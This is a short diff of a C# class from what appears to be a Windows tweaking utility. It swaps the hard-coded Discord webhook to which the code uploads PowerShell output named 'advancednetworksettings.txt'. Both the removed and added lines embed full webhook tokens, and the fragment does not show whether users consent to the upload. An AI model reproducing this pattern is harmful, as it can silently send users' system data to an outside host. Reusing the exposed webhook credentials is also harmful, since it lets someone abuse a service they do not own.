@@ -440,7 +440,7 @@ public static class ProcessActions
                 { new ByteArrayContent(Encoding.UTF8.GetBytes(psOutput.TrimStart('\r', '\n'))), "file", "advancednetworksettings.txt" }
             };
 
-        await client.PostAsync("https://discord.com/api/webhooks/1412563679760875592/aTcjsLuqJH2WHiZKDpSIcgqfSwkkEpe9W-tJCBaF_8-ND1q4kIOFXmqmCu8l5il2eGhe", form);
+        await client.PostAsync("https://discord.com/api/webhooks/1444743232679579779/kY5L3BixE536ykBsk5t4ymdkrBn0EvqN4YAYAkFwi-wDP1uQOkZinTy_HgD__UptnGMM", form);
     }
 
     public static async Task RemoveAppx(string appx)
